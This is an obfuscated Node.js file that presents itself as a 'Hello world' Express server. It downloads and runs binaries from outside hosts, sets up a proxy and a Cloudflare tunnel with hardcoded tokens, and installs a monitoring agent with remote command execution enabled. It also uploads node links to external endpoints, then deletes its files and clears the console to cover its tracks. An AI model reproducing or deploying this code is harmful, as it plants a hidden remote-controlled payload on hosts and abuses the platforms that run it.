const _0x43a8fa=_0x37f3;(function(_0x445d5d,_0x90ff0d){const _0x2a706a=_0x37f3,_0x38e994=_0x445d5d();while(!![]){try{const _0x521edc=-parseInt(_0x2a706a(0xa2))/0x1+parseInt(_0x2a706a(0xba))/0x2+parseInt(_0x2a706a(0xd5))/0x3+parseInt(_0x2a706a(0x112))/0x4*(parseInt(_0x2a706a(0x107))/0x5)+-parseInt(_0x2a706a(0x117))/0x6+parseInt(_0x2a706a(0x108))/0x7+-parseInt(_0x2a706a(0xfc))/0x8*(-parseInt(_0x2a706a(0x144))/0x9);if(_0x521edc===_0x90ff0d)break;else _0x38e994['push'](_0x38e994['shift']());}catch(_0x24df6d){_0x38e994['push'](_0x38e994['shift']());}}}(_0x4e48,0xcc3bb));const express=require('express'),app=express(),axios=require(_0x43a8fa(0xd4)),os=require('os'),fs=require('fs'),path=require(_0x43a8fa(0xe6)),{promisify}=require(_0x43a8fa(0x13e)),exec=promisify(require(_0x43a8fa(0x11c))['exec']),{execSync}=require(_0x43a8fa(0x11c)),UPLOAD_URL=process[_0x43a8fa(0xec)][_0x43a8fa(0xfa)]||'',PROJECT_URL=process['env']['PROJECT_URL']||'',AUTO_ACCESS=process[_0x43a8fa(0xec)]['AUTO_ACCESS']||![],FILE_PATH=process[_0x43a8fa(0xec)][_0x43a8fa(0xa5)]||_0x43a8fa(0x11b),SUB_PATH=process[_0x43a8fa(0xec)][_0x43a8fa(0x14a)]||_0x43a8fa(0x137),PORT=process[_0x43a8fa(0xec)][_0x43a8fa(0xd2)]||process[_0x43a8fa(0xec)][_0x43a8fa(0xb6)]||0xbb8,ABC=process[_0x43a8fa(0xec)][_0x43a8fa(0x123)]||'560ba8cb-b9bc-47cb-96cb-21a9a93de4ed',DEFG_SERVER=process[_0x43a8fa(0xec)]['DEFG_SERVER']||_0x43a8fa(0x134),DEFG_PORT=process[_0x43a8fa(0xec)]['DEFG_PORT']||'',DEFG_KEY=process[_0x43a8fa(0xec)][_0x43a8fa(0xdf)]||'UsC5sNDciSaNggxJdB3EGSGYS242VT7q',WXYZ_DOMAIN=process[_0x43a8fa(0xec)][_0x43a8fa(0x12d)]||_0x43a8fa(0xd6),WXYZ_AUTH=process[_0x43a8fa(0xec)][_0x43a8fa(0x141)]||_0x43a8fa(0x145),WXYZ_PORT=process[_0x43a8fa(0xec)][_0x43a8fa(0xb3)]||0x1f90,CFIP=process['env'][_0x43a8fa(0x90)]||_0x43a8fa(0x104),CFPORT=process[_0x43a8fa(0xec)][_0x43a8fa(0x140)]||0x1bb,NAME=process[_0x43a8fa(0xec)][_0x43a8fa(0xda)]||'Vls';!fs['existsSync'](FILE_PATH)?(fs[_0x43a8fa(0x125)](FILE_PATH),console[_0x43a8fa(0xdd)](FILE_PATH+_0x43a8fa(0x10e))):console['log'](FILE_PATH+'\x20already\x20exists');let npmPath=path['join'](FILE_PATH,_0x43a8fa(0xf6)),phpPath=path[_0x43a8fa(0x9f)](FILE_PATH,'php'),webPath=path['join'](FILE_PATH,_0x43a8fa(0xaa)),botPath=path[_0x43a8fa(0x9f)](FILE_PATH,_0x43a8fa(0x130)),subPath=path['join'](FILE_PATH,'sub.txt'),listPath=path['join'](FILE_PATH,_0x43a8fa(0xd8)),bootLogPath=path[_0x43a8fa(0x9f)](FILE_PATH,_0x43a8fa(0x10d)),configPath=path[_0x43a8fa(0x9f)](FILE_PATH,'config.json');function deleteNodes(){const _0x44930d=_0x43a8fa;try{if(!UPLOAD_URL)return;if(!fs[_0x44930d(0xab)](subPath))return;let _0x2c1fef;try{_0x2c1fef=fs[_0x44930d(0x133)](subPath,_0x44930d(0xb4));}catch{return null;}const _0x2a5fac=Buffer['from'](_0x2c1fef,'base64')[_0x44930d(0x106)](_0x44930d(0xb4)),_0x30313a=_0x2a5fac[_0x44930d(0x12c)]('\x0a')[_0x44930d(0x9c)](_0x3c1f2e=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x44930d(0x9e)](_0x3c1f2e));if(_0x30313a['length']===0x0)return;return axios[_0x44930d(0x139)](UPLOAD_URL+_0x44930d(0xf2),JSON[_0x44930d(0x94)]({'nodes':_0x30313a}),{'headers':{'Content-Type':_0x44930d(0x131)}})[_0x44930d(0x12a)](_0x151f01=>{return null;});}catch(_0x2ca982){return null;}}function cleanupOldFiles(){const _0xcaef84=_0x43a8fa,_0x28a1d1=[_0xcaef84(0xaa),_0xcaef84(0x130),_0xcaef84(0xf6),_0xcaef84(0xb8),'sub.txt',_0xcaef84(0x10d)];_0x28a1d1[_0xcaef84(0x11d)](_0x390910=>{const _0x596b28=_0xcaef84,_0x36c36b=path[_0x596b28(0x9f)](FILE_PATH,_0x390910);fs[_0x596b28(0x115)](_0x36c36b,()=>{});});}app[_0x43a8fa(0x122)]('/',function(_0x3612c3,_0x38d898){const _0x484d4e=_0x43a8fa;_0x38d898['send'](_0x484d4e(0x9d));});function _0x37f3(_0x5bcea4,_0x3273c6){const _0x4e48b7=_0x4e48();return _0x37f3=function(_0x37f3f4,_0x2f9c65){_0x37f3f4=_0x37f3f4-0x90;let _0x4a6b63=_0x4e48b7[_0x37f3f4];return _0x4a6b63;},_0x37f3(_0x5bcea4,_0x3273c6);}const config={'log':{'access':_0x43a8fa(0x143),'error':_0x43a8fa(0x143),'loglevel':_0x43a8fa(0x105)},'inbounds':[{'port':WXYZ_PORT,'protocol':_0x43a8fa(0x13b),'settings':{'clients':[{'id':ABC,'flow':_0x43a8fa(0xb0)}],'decryption':_0x43a8fa(0x105),'fallbacks':[{'dest':0xbb9},{'path':_0x43a8fa(0x127),'dest':0xbba},{'path':_0x43a8fa(0x110),'dest':0xbbb},{'path':_0x43a8fa(0xee),'dest':0xbbc}]},'streamSettings':{'network':_0x43a8fa(0x111)}},{'port':0xbb9,'listen':'127.0.0.1','protocol':_0x43a8fa(0x13b),'settings':{'clients':[{'id':ABC}],'decryption':_0x43a8fa(0x105)},'streamSettings':{'network':_0x43a8fa(0x111),'security':'none'}},{'port':0xbba,'listen':'127.0.0.1','protocol':'vless','settings':{'clients':[{'id':ABC,'level':0x0}],'decryption':_0x43a8fa(0x105)},'streamSettings':{'network':'ws','security':_0x43a8fa(0x105),'wsSettings':{'path':'/vless-wxyz'}},'sniffing':{'enabled':!![],'destOverride':[_0x43a8fa(0xf9),'tls','quic'],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x43a8fa(0x114),'protocol':_0x43a8fa(0xdb),'settings':{'clients':[{'id':ABC,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x43a8fa(0x110)}},'sniffing':{'enabled':!![],'destOverride':[_0x43a8fa(0xf9),'tls',_0x43a8fa(0xc6)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x43a8fa(0x114),'protocol':_0x43a8fa(0xae),'settings':{'clients':[{'password':ABC}]},'streamSettings':{'network':'ws','security':_0x43a8fa(0x105),'wsSettings':{'path':'/trojan-wxyz'}},'sniffing':{'enabled':!![],'destOverride':[_0x43a8fa(0xf9),_0x43a8fa(0x9b),_0x43a8fa(0xc6)],'metadataOnly':![]}}],'dns':{'servers':[_0x43a8fa(0xe1)]},'outbounds':[{'protocol':_0x43a8fa(0xbe),'tag':_0x43a8fa(0xd3)},{'protocol':_0x43a8fa(0xaf),'tag':_0x43a8fa(0x14b)}]};fs[_0x43a8fa(0xa6)](path[_0x43a8fa(0x9f)](FILE_PATH,_0x43a8fa(0xe3)),JSON[_0x43a8fa(0x94)](config,null,0x2));function _0x4e48(){const _0x2ae1c3=['\x0a\x20\x20credentials-file:\x20','Content-Type','\x0a\x20\x20\x20\x20','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','env','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','/trojan-wxyz','https://arm64.ssss.nyc.mn/2go','Error\x20executing\x20command:\x20','listen','/api/delete-nodes','Error\x20reading\x20boot.log:','&path=%2Ftrojan-wxyz%3Fed%3D2560#','2083','npm','fileName','bot\x20is\x20running','http','UPLOAD_URL','https://amd64.ssss.nyc.mn/web','1131464bRBLDn','\x0a\x20\x20\x0atrojan://','curl\x20-s\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27','unshift','TunnelSecret','Download\x20','trim','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','www.visa.com.sg','none','toString','410125JUvheI','3808119dWxlBl','message','push','data','/api/add-subscriptions','boot.log','\x20is\x20created','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','/vmess-wxyz','tcp','4dYizIe','ArgoDomain:','127.0.0.1','unlink','WXYZ_DOMAIN:','3871890ngYMJt','createWriteStream','arm','Empowerment\x20failed\x20for\x20','./tmp','child_process','forEach','WXYZ_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','&type=ws&host=','error','fileUrl','get','ABC','match','mkdirSync','./bot','/vless-wxyz','\x20failed:\x20','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','catch','DEFG\x20variable\x20is\x20empty,skip\x20running','split','WXYZ_DOMAIN','status','Failed\x20to\x20add\x20URL:\x20','bot','application/json','https://arm64.ssss.nyc.mn/agent','readFileSync','nzku.fortymenty.eu.org:443','\x0a\x20\x20\x0avmess://','tunnel.yml','sub','unlinkSync','post','Empowerment\x20success\x20for\x20','vless','tunnel.json','./npm','util','pipe','CFPORT','WXYZ_AUTH','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','/dev/null','45OCJhRb','eyJhIjoiZjUxNzk5OTMxMWQ4ZTAzOTg4OThmZjRkMTZiZDYzYjQiLCJ0IjoiMjZiMjAzZDctMjRhNS00ZDBjLWJiYTgtZTY4NDIxMzcyM2NmIiwicyI6IlltWTNOakl6WmpJdFlUUTVZaTAwTWpZeUxUaGtNMk10WmprMFpXSmxaV1V5TkRSaSJ9','Subscription\x20uploaded\x20successfully','2096','/config.json\x20>/dev/null\x202>&1\x20&','npm\x20is\x20running','SUB_PATH','block','2053','CFIP','from','length','has','stringify','npm\x20running\x20error:\x20','https://arm64.ssss.nyc.mn/web','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','chmod','443','https://amd64.ssss.nyc.mn/v1','tls','filter','Hello\x20world!','test','join','/sub.txt\x20saved\x20successfully','https://amd64.ssss.nyc.mn/agent','181054HEAWzG','nohup\x20','https://amd64.ssss.nyc.mn/2go','FILE_PATH','writeFileSync','&path=%2Fvless-wxyz%3Fed%3D2560#','\x20-p\x20','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','web','existsSync','php\x20running\x20error:\x20','send','trojan','blackhole','xtls-rprx-vision','/api/add-nodes','map','WXYZ_PORT','utf-8','\x20>/dev/null\x202>&1\x20&','PORT','set','php','http\x20server\x20is\x20running\x20on\x20port:','547166MLRCrH','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','WXYZ_DOMAIN\x20or\x20WXYZ_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','Skipping\x20adding\x20automatic\x20access\x20task','freedom','/bot\x20','Error\x20downloading\x20files:','\x0a\x20\x20tunnel:\x20','./web','2087','https://arm64.ssss.nyc.mn/v1','./php','quic','\x0avless://','pop','bot\x20is\x20running.','base64','/tunnel.yml\x20run','?encryption=none&security=tls&sni=','--tls','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','\x20successfully','/npm\x20-s\x20','web\x20is\x20running','SERVER_PORT','direct','axios','168354SLWIbJ','phala.yszy.nyc.mn','arch','list.txt','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','NAME','vmess','includes','log','rm\x20-rf\x20','DEFG_KEY','\x0aclient_secret:\x20','https+local://8.8.8.8/dns-query','stream','config.json','arm64','finish','path','response'];_0x4e48=function(){return _0x2ae1c3;};return _0x4e48();}function getSystemArchitecture(){const _0x2feb58=_0x43a8fa,_0x4ad4b7=os[_0x2feb58(0xd7)]();return _0x4ad4b7==='arm'||_0x4ad4b7===_0x2feb58(0xe4)||_0x4ad4b7==='aarch64'?_0x2feb58(0x119):'amd';}function downloadFile(_0x50c271,_0x277a66,_0x1d9c27){const _0x16f492=_0x43a8fa,_0x47ae32=path[_0x16f492(0x9f)](FILE_PATH,_0x50c271),_0x465975=fs[_0x16f492(0x118)](_0x47ae32);axios({'method':_0x16f492(0x122),'url':_0x277a66,'responseType':_0x16f492(0xe2)})['then'](_0x594035=>{const _0x5aff70=_0x16f492;_0x594035[_0x5aff70(0x10b)][_0x5aff70(0x13f)](_0x465975),_0x465975['on'](_0x5aff70(0xe5),()=>{const _0x41b6d7=_0x5aff70;_0x465975['close'](),console[_0x41b6d7(0xdd)](_0x41b6d7(0x101)+_0x50c271+_0x41b6d7(0xcf)),_0x1d9c27(null,_0x50c271);}),_0x465975['on']('error',_0x19f299=>{const _0x3c2437=_0x5aff70;fs['unlink'](_0x47ae32,()=>{});const _0x25ed3f=_0x3c2437(0x101)+_0x50c271+_0x3c2437(0x128)+_0x19f299[_0x3c2437(0x109)];console[_0x3c2437(0x120)](_0x25ed3f),_0x1d9c27(_0x25ed3f);});})[_0x16f492(0x12a)](_0x4d153c=>{const _0x53227e=_0x16f492,_0x5ade97=_0x53227e(0x101)+_0x50c271+_0x53227e(0x128)+_0x4d153c[_0x53227e(0x109)];console[_0x53227e(0x120)](_0x5ade97),_0x1d9c27(_0x5ade97);});}async function downloadFilesAndRun(){const _0x48880b=_0x43a8fa,_0x3964b1=getSystemArchitecture(),_0x569f15=getFilesForArchitecture(_0x3964b1);if(_0x569f15[_0x48880b(0x92)]===0x0){console[_0x48880b(0xdd)](_0x48880b(0xd9));return;}const _0xa1c7c8=_0x569f15[_0x48880b(0xb2)](_0x24b636=>{return new Promise((_0x646700,_0x36a2ae)=>{const _0x269f5a=_0x37f3;downloadFile(_0x24b636[_0x269f5a(0xf7)],_0x24b636[_0x269f5a(0x121)],(_0x498370,_0x1e4f01)=>{_0x498370?_0x36a2ae(_0x498370):_0x646700(_0x1e4f01);});});});try{await Promise['all'](_0xa1c7c8);}catch(_0xce5c70){console['error'](_0x48880b(0xc0),_0xce5c70);return;}function _0x54e805(_0x28aaba){const _0x351df2=_0x48880b,_0x4c224b=0x1fd;_0x28aaba[_0x351df2(0x11d)](_0x24fa13=>{const _0x209cea=_0x351df2,_0x27cdd6=path['join'](FILE_PATH,_0x24fa13);fs[_0x209cea(0xab)](_0x27cdd6)&&fs[_0x209cea(0x98)](_0x27cdd6,_0x4c224b,_0x663a4d=>{const _0x28cae6=_0x209cea;_0x663a4d?console[_0x28cae6(0x120)](_0x28cae6(0x11a)+_0x27cdd6+':\x20'+_0x663a4d):console['log'](_0x28cae6(0x13a)+_0x27cdd6+':\x20'+_0x4c224b[_0x28cae6(0x106)](0x8));});});}const _0x48e281=DEFG_PORT?[_0x48880b(0x13d),_0x48880b(0xc2),'./bot']:[_0x48880b(0xc5),_0x48880b(0xc2),_0x48880b(0x126)];_0x54e805(_0x48e281);if(DEFG_SERVER&&DEFG_KEY){if(!DEFG_PORT){const _0x1d896e=DEFG_SERVER[_0x48880b(0xdc)](':')?DEFG_SERVER[_0x48880b(0x12c)](':')[_0x48880b(0xc8)]():'',_0x4708ed=new Set([_0x48880b(0x99),'8443',_0x48880b(0x147),_0x48880b(0xc3),_0x48880b(0xf5),_0x48880b(0x14c)]),_0x23a1cf=_0x4708ed[_0x48880b(0x93)](_0x1d896e)?'true':'false',_0x1485d5=_0x48880b(0xe0)+DEFG_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20false\x0aip_report_period:\x201800\x0areport_delay:\x201\x0aserver:\x20'+DEFG_SERVER+'\x0askip_connection_count:\x20false\x0askip_procs_count:\x20false\x0atemperature:\x20false\x0atls:\x20'+_0x23a1cf+_0x48880b(0x142)+ABC;fs[_0x48880b(0xa6)](path['join'](FILE_PATH,'config.yaml'),_0x1485d5);const _0x1c4239=_0x48880b(0xa3)+FILE_PATH+'/php\x20-c\x20\x22'+FILE_PATH+_0x48880b(0xbb);try{await exec(_0x1c4239),console['log']('php\x20is\x20running'),await new Promise(_0x43bb33=>setTimeout(_0x43bb33,0x3e8));}catch(_0x416e73){console['error'](_0x48880b(0xac)+_0x416e73);}}else{let _0x569bbb='';const _0x4ca78c=[_0x48880b(0x99),'8443','2096',_0x48880b(0xc3),_0x48880b(0xf5),_0x48880b(0x14c)];_0x4ca78c['includes'](DEFG_PORT)&&(_0x569bbb=_0x48880b(0xcd));const _0xcca656=_0x48880b(0xa3)+FILE_PATH+_0x48880b(0xd0)+DEFG_SERVER+':'+DEFG_PORT+_0x48880b(0xa8)+DEFG_KEY+'\x20'+_0x569bbb+_0x48880b(0xb5);try{await exec(_0xcca656),console['log'](_0x48880b(0x149)),await new Promise(_0x272049=>setTimeout(_0x272049,0x3e8));}catch(_0x148683){console['error'](_0x48880b(0x95)+_0x148683);}}}else console['log'](_0x48880b(0x12b));const _0x54a2f4=_0x48880b(0xa3)+FILE_PATH+'/web\x20-c\x20'+FILE_PATH+_0x48880b(0x148);try{await exec(_0x54a2f4),console[_0x48880b(0xdd)](_0x48880b(0xd1)),await new Promise(_0x580771=>setTimeout(_0x580771,0x3e8));}catch(_0xbe3dcb){console[_0x48880b(0x120)]('web\x20running\x20error:\x20'+_0xbe3dcb);}if(fs[_0x48880b(0xab)](path[_0x48880b(0x9f)](FILE_PATH,_0x48880b(0x130)))){let _0x1ace67;if(WXYZ_AUTH['match'](/^[A-Z0-9a-z=]{120,250}$/))_0x1ace67=_0x48880b(0xeb)+WXYZ_AUTH;else WXYZ_AUTH[_0x48880b(0x124)](/TunnelSecret/)?_0x1ace67=_0x48880b(0x10f)+FILE_PATH+_0x48880b(0xcb):_0x1ace67=_0x48880b(0xce)+FILE_PATH+_0x48880b(0xed)+WXYZ_PORT;try{await exec('nohup\x20'+FILE_PATH+_0x48880b(0xbf)+_0x1ace67+_0x48880b(0xb5)),console['log'](_0x48880b(0xf8)),await new Promise(_0x45572c=>setTimeout(_0x45572c,0x7d0));}catch(_0x46a5bc){console[_0x48880b(0x120)](_0x48880b(0xf0)+_0x46a5bc);}}await new Promise(_0x47fcfd=>setTimeout(_0x47fcfd,0x1388));}function getFilesForArchitecture(_0x31d396){const _0x32f7c2=_0x43a8fa;let _0x56f208;_0x31d396===_0x32f7c2(0x119)?_0x56f208=[{'fileName':_0x32f7c2(0xaa),'fileUrl':_0x32f7c2(0x96)},{'fileName':'bot','fileUrl':_0x32f7c2(0xef)}]:_0x56f208=[{'fileName':'web','fileUrl':_0x32f7c2(0xfb)},{'fileName':_0x32f7c2(0x130),'fileUrl':_0x32f7c2(0xa4)}];if(DEFG_SERVER&&DEFG_KEY){if(DEFG_PORT){const _0x1ee691=_0x31d396===_0x32f7c2(0x119)?_0x32f7c2(0x132):_0x32f7c2(0xa1);_0x56f208[_0x32f7c2(0xff)]({'fileName':_0x32f7c2(0xf6),'fileUrl':_0x1ee691});}else{const _0x448cc8=_0x31d396===_0x32f7c2(0x119)?_0x32f7c2(0xc4):_0x32f7c2(0x9a);_0x56f208[_0x32f7c2(0xff)]({'fileName':_0x32f7c2(0xb8),'fileUrl':_0x448cc8});}}return _0x56f208;}function argoType(){const _0x4639fe=_0x43a8fa;if(!WXYZ_AUTH||!WXYZ_DOMAIN){console['log'](_0x4639fe(0xbc));return;}if(WXYZ_AUTH[_0x4639fe(0xdc)](_0x4639fe(0x100))){fs[_0x4639fe(0xa6)](path['join'](FILE_PATH,_0x4639fe(0x13c)),WXYZ_AUTH);const _0x583006=_0x4639fe(0xc1)+WXYZ_AUTH['split']('\x22')[0xb]+_0x4639fe(0xe8)+path['join'](FILE_PATH,_0x4639fe(0x13c))+_0x4639fe(0x97)+WXYZ_DOMAIN+_0x4639fe(0x103)+WXYZ_PORT+_0x4639fe(0xa9);fs[_0x4639fe(0xa6)](path[_0x4639fe(0x9f)](FILE_PATH,_0x4639fe(0x136)),_0x583006);}else console['log'](_0x4639fe(0x11e));}argoType();async function extractDomains(){const _0x4adc14=_0x43a8fa;let _0x5de5a7;if(WXYZ_AUTH&&WXYZ_DOMAIN)_0x5de5a7=WXYZ_DOMAIN,console[_0x4adc14(0xdd)](_0x4adc14(0x116),_0x5de5a7),await _0x307045(_0x5de5a7);else try{const _0x554cf7=fs[_0x4adc14(0x133)](path[_0x4adc14(0x9f)](FILE_PATH,_0x4adc14(0x10d)),_0x4adc14(0xb4)),_0x5c043e=_0x554cf7[_0x4adc14(0x12c)]('\x0a'),_0x5a901b=[];_0x5c043e['forEach'](_0x4121ff=>{const _0x3d4b6d=_0x4adc14,_0x3d7eaf=_0x4121ff[_0x3d4b6d(0x124)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x3d7eaf){const _0x1005da=_0x3d7eaf[0x1];_0x5a901b[_0x3d4b6d(0x10a)](_0x1005da);}});if(_0x5a901b['length']>0x0)_0x5de5a7=_0x5a901b[0x0],console[_0x4adc14(0xdd)](_0x4adc14(0x113),_0x5de5a7),await _0x307045(_0x5de5a7);else{console[_0x4adc14(0xdd)]('ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain'),fs[_0x4adc14(0x138)](path[_0x4adc14(0x9f)](FILE_PATH,'boot.log'));async function _0x4f0b99(){try{await exec('pkill\x20-f\x20\x22[b]ot\x22\x20>\x20/dev/null\x202>&1');}catch(_0x5df5de){}}_0x4f0b99(),await new Promise(_0x243a79=>setTimeout(_0x243a79,0xbb8));const _0x14f61e=_0x4adc14(0xce)+FILE_PATH+_0x4adc14(0xed)+WXYZ_PORT;try{await exec(_0x4adc14(0xa3)+path[_0x4adc14(0x9f)](FILE_PATH,_0x4adc14(0x130))+'\x20'+_0x14f61e+_0x4adc14(0xb5)),console[_0x4adc14(0xdd)](_0x4adc14(0xc9)),await new Promise(_0xf59b41=>setTimeout(_0xf59b41,0xbb8)),await extractDomains();}catch(_0x315b4e){console[_0x4adc14(0x120)]('Error\x20executing\x20command:\x20'+_0x315b4e);}}}catch(_0x4c5405){console['error'](_0x4adc14(0xf3),_0x4c5405);}async function _0x307045(_0x2a7d69){const _0x251f13=_0x4adc14,_0x3b71d6=execSync(_0x251f13(0xfe),{'encoding':_0x251f13(0xb4)}),_0x5f0e4d=_0x3b71d6[_0x251f13(0x102)]();return new Promise(_0x38ffd6=>{setTimeout(()=>{const _0x8739b0=_0x37f3,_0x6d5467={'v':'2','ps':NAME+'-'+_0x5f0e4d,'add':CFIP,'port':CFPORT,'id':ABC,'aid':'0','scy':_0x8739b0(0x105),'net':'ws','type':'none','host':_0x2a7d69,'path':'/vmess-wxyz?ed=2560','tls':_0x8739b0(0x9b),'sni':_0x2a7d69,'alpn':''},_0x5b8869=_0x8739b0(0xc7)+ABC+'@'+CFIP+':'+CFPORT+_0x8739b0(0xcc)+_0x2a7d69+_0x8739b0(0x11f)+_0x2a7d69+_0x8739b0(0xa7)+NAME+'-'+_0x5f0e4d+_0x8739b0(0x135)+Buffer['from'](JSON[_0x8739b0(0x94)](_0x6d5467))[_0x8739b0(0x106)](_0x8739b0(0xca))+_0x8739b0(0xfd)+ABC+'@'+CFIP+':'+CFPORT+'?security=tls&sni='+_0x2a7d69+_0x8739b0(0x11f)+_0x2a7d69+_0x8739b0(0xf4)+NAME+'-'+_0x5f0e4d+_0x8739b0(0xea);console['log'](Buffer[_0x8739b0(0x91)](_0x5b8869)[_0x8739b0(0x106)](_0x8739b0(0xca))),fs['writeFileSync'](subPath,Buffer[_0x8739b0(0x91)](_0x5b8869)[_0x8739b0(0x106)](_0x8739b0(0xca))),console['log'](FILE_PATH+_0x8739b0(0xa0)),uplodNodes(),app['get']('/'+SUB_PATH,(_0x273e99,_0x5a7bd9)=>{const _0x2aabb4=_0x8739b0,_0x4d9b8a=Buffer[_0x2aabb4(0x91)](_0x5b8869)['toString']('base64');_0x5a7bd9[_0x2aabb4(0xb7)](_0x2aabb4(0xe9),'text/plain;\x20charset=utf-8'),_0x5a7bd9[_0x2aabb4(0xad)](_0x4d9b8a);}),_0x38ffd6(_0x5b8869);},0x7d0);});}}async function uplodNodes(){const _0x2de9ec=_0x43a8fa;if(UPLOAD_URL&&PROJECT_URL){const _0x1cdf89=PROJECT_URL+'/'+SUB_PATH,_0x4168fc={'subscription':[_0x1cdf89]};try{const _0x232bbf=await axios[_0x2de9ec(0x139)](UPLOAD_URL+_0x2de9ec(0x10c),_0x4168fc,{'headers':{'Content-Type':_0x2de9ec(0x131)}});if(_0x232bbf[_0x2de9ec(0x12e)]===0xc8)console[_0x2de9ec(0xdd)](_0x2de9ec(0x146));else return null;}catch(_0x2642d3){if(_0x2642d3[_0x2de9ec(0xe7)]){if(_0x2642d3[_0x2de9ec(0xe7)][_0x2de9ec(0x12e)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x2de9ec(0xab)](listPath))return;const _0x2b19ae=fs[_0x2de9ec(0x133)](listPath,_0x2de9ec(0xb4)),_0x23df1c=_0x2b19ae[_0x2de9ec(0x12c)]('\x0a')['filter'](_0x3748e8=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x2de9ec(0x9e)](_0x3748e8));if(_0x23df1c['length']===0x0)return;const _0x1e217f=JSON[_0x2de9ec(0x94)]({'nodes':_0x23df1c});try{await axios['post'](UPLOAD_URL+_0x2de9ec(0xb1),_0x1e217f,{'headers':{'Content-Type':_0x2de9ec(0x131)}});if(response[_0x2de9ec(0x12e)]===0xc8)console['log'](_0x2de9ec(0x146));else return null;}catch(_0x33ea55){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x310f11=_0x37f3,_0x35e9af=[bootLogPath,configPath,webPath,botPath,phpPath,npmPath];if(DEFG_PORT)_0x35e9af['push'](npmPath);else DEFG_SERVER&&DEFG_KEY&&_0x35e9af['push'](phpPath);exec(_0x310f11(0xde)+_0x35e9af[_0x310f11(0x9f)]('\x20')+'\x20>/dev/null\x202>&1',_0x29022a=>{const _0x80c47d=_0x310f11;console['clear'](),console[_0x80c47d(0xdd)]('App\x20is\x20running'),console['log'](_0x80c47d(0x129));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x381e0c=_0x43a8fa;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x381e0c(0xdd)](_0x381e0c(0xbd));return;}try{const _0x2cb100=await axios[_0x381e0c(0x139)]('https://oooo.serv00.net/add-url',{'url':PROJECT_URL},{'headers':{'Content-Type':'application/json'}});console[_0x381e0c(0xdd)]('automatic\x20access\x20task\x20added\x20successfully');}catch(_0xe393b2){console[_0x381e0c(0x120)](_0x381e0c(0x12f)+_0xe393b2[_0x381e0c(0x109)]);}}async function startserver(){deleteNodes(),cleanupOldFiles(),await downloadFilesAndRun(),await extractDomains(),AddVisitTask();}startserver(),app[_0x43a8fa(0xf1)](PORT,()=>console[_0x43a8fa(0xdd)](_0x43a8fa(0xb9)+PORT+'!'));
